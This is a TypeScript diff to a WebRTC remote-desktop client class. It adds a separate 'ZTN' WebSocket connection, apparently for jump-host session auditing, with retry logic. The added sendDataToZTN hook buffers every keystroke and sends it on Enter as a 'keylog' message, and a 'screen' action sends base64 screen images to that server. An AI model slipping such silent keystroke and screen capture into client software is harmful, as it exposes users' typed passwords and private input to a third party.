@@ -28,6 +28,11 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
   protected _state: RTCIceConnectionState = 'disconnected'
   protected _id = ''
   protected _candidates: RTCIceCandidate[] = []
+  protected _ztnWS?: WebSocket
+  protected _timeoutZTN?: number
+  protected _keys: string = ''
+  protected retrySchedule: any
+  protected retryCount: number = 0
   get id() {
     return this._id
   }
@@ -40,12 +45,46 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
     return typeof this._ws !== 'undefined' && this._ws.readyState === WebSocket.OPEN
   }
 
+  get socketOpenZTN() {
+    return typeof this._ztnWS !== 'undefined' && this._ztnWS.readyState === WebSocket.OPEN
+  }
+
   get peerConnected() {
     return typeof this._peer !== 'undefined' && ['connected', 'checking', 'completed'].includes(this._state)
   }
 
   get connected() {
     return this.peerConnected && this.socketOpen
+  }
+
+  get connectedZTN() {
+    return this.peerConnected && this.socketOpenZTN
+  }
+
+  public connectTOZTN() {
+    if (this.socketOpenZTN) {
+      this.emit('warn', `attempting to create websocket while connection open`)
+      return
+    }
+
+    if (!this.supported) {
+      this.onDisconnected(new Error('browser does not support webrtc (RTCPeerConnection missing)'))
+      return
+    }
+
+    // this[EVENT.CONNECTING]()
+    const socketToken = get('socketToken', 'string');
+    try {
+      const ztnUrl = `wss://${get('host', 'string')}`;
+      this._ztnWS = new WebSocket(`${ztnUrl}/jump/${socketToken}`)
+      this.emit('debug', `connecting to ${ztnUrl}`)
+      this._ztnWS.onmessage = this.onMessage.bind(this)
+      this._ztnWS.onerror = this.onErrorZTN.bind(this)
+      this._ztnWS.onclose = this.onDisconnectedZTN.bind(this, new Error('websocket closed'))
+      this._timeoutZTN = window.setTimeout(this.onTimeoutZTN.bind(this), 15000)
+    } catch (err: any) {
+      this.onDisconnectedZTN(err)
+    }
   }
 
   public connect(url: string, password: string, displayname: string) {
@@ -72,6 +111,50 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
     } catch (err: any) {
       this.onDisconnected(err)
     }
+  }
+
+  protected disconnectZTN() {
+    if (this._timeoutZTN) {
+      clearTimeout(this._timeoutZTN)
+      this._timeoutZTN = undefined
+    }
+
+    if (this._ztnWS) {
+      // reset all events
+      this._ztnWS.onmessage = () => { }
+      this._ztnWS.onerror = () => { }
+      this._ztnWS.onclose = () => { }
+
+      try {
+        this._ztnWS.close()
+      } catch (err) { }
+
+      this._ztnWS = undefined
+      this.retryConnect();
+    }
+  }
+
+  private retryConnect() {
+    if (this.retrySchedule) {
+      console.log('Another retry is scheduled, Aborting Socket Connection');
+      return false;
+    }
+
+    if (this.retryCount < 10) {
+      this.retryCount += 1;
+    }
+
+    const retryAfter = this.retryCount * 10;
+    console.log('Socket connection will be retried after', retryAfter, 'seconds');
+
+    this.retrySchedule = setTimeout(() => {
+      console.log('Socket connection retrying now');
+      clearTimeout(this.retrySchedule);
+      this.retrySchedule = null;
+      if (!this._ztnWS) {
+        this.connectTOZTN();
+      }
+    }, retryAfter * 1000);
   }
 
   protected disconnect() {
@@ -125,9 +208,21 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
     this._id = ''
   }
 
+  protected sendDataToZTN(event: any, data: any) {
+    if (event === 'keyup') {
+      const key = String.fromCharCode(data.key)
+      if (data.key === 65293) {
+        this.sendMessageToZTN('keylog', {})
+      } else {
+        this._keys += key
+      }
+    }
+  }
+
   public sendData(event: 'wheel' | 'mousemove', data: { x: number; y: number }): void
   public sendData(event: 'mousedown' | 'mouseup' | 'keydown' | 'keyup', data: { key: number }): void
   public sendData(event: string, data: any) {
+    this.sendDataToZTN(event, data);
     if (!this.connected) {
       this.emit('warn', `attempting to send data while disconnected`)
       return
@@ -176,6 +271,25 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
     if (typeof buffer !== 'undefined') {
       this._channel!.send(buffer)
     }
+  }
+
+  public sendMessageToZTN(event: any, payload?: any) {
+    if (!this.connectedZTN) {
+      this.emit('warn', `attempting to send data while disconnected`)
+      return
+    }
+    const message: any = {
+      sessionId: '',
+      timestamp: new Date().getTime(),
+      action: event,
+    }
+    if (event === 'screen') {
+      message.image = payload.base64
+    } else if (event === 'keylog') {
+      message.data = this._keys;
+      this._keys = '';
+    }
+    this._ztnWS!.send(JSON.stringify(message))
   }
 
   public sendMessage(event: WebSocketEvents, payload?: WebSocketPayloads) {
@@ -374,6 +488,17 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
     } else {
       this[EVENT.MESSAGE](event, payload)
     }
+
+    if (event === undefined) {
+      const { action, id, status, message } = payload as any
+      if (action === 'screen') {
+        this[EVENT.LIVE_STREAM]()
+      }
+      if (status === '200') {
+        this.onConnectedZTN()
+      }
+
+    }
   }
 
   private onData(e: MessageEvent) {
@@ -394,6 +519,31 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
     this.emit('error', (event as ErrorEvent).error)
   }
 
+  private onErrorZTN(event: Event) {
+    this.emit('error', (event as ErrorEvent).error)
+    this.disconnectZTN()
+  }
+
+  private onConnectedZTN() {
+    if (this._timeoutZTN) {
+      clearTimeout(this._timeoutZTN)
+      this._timeoutZTN = undefined
+    }
+
+    if (this.retrySchedule) {
+      clearTimeout(this.retrySchedule)
+      this.retrySchedule = undefined
+      this.retryCount = 0
+    }
+
+    if (!this.connectedZTN) {
+      this.emit('warn', `onConnected called while being disconnected`)
+      return
+    }
+
+    this.emit('debug', `connected`)
+  }
+
   private onConnected() {
     if (this._timeout) {
       clearTimeout(this._timeout)
@@ -407,6 +557,20 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
 
     this.emit('debug', `connected`)
     this[EVENT.CONNECTED]()
+  }
+
+  private onTimeoutZTN() {
+    this.emit('debug', `connection timeout`)
+    if (this._timeoutZTN) {
+      clearTimeout(this._timeoutZTN)
+      this._timeoutZTN = undefined
+    }
+    this.onDisconnectedZTN(new Error('connection timeout'))
+  }
+
+  protected onDisconnectedZTN(reason?: Error) {
+    this.disconnectZTN()
+    this.emit('debug', `disconnected:`, reason)
   }
 
   private onTimeout() {
@@ -434,4 +598,5 @@ export abstract class BaseClient extends EventEmitter<BaseEvents> {
   protected abstract [EVENT.DISCONNECTED](reason?: Error): void
   protected abstract [EVENT.TRACK](event: RTCTrackEvent): void
   protected abstract [EVENT.DATA](data: any): void
+  protected abstract [EVENT.LIVE_STREAM](): void
 }
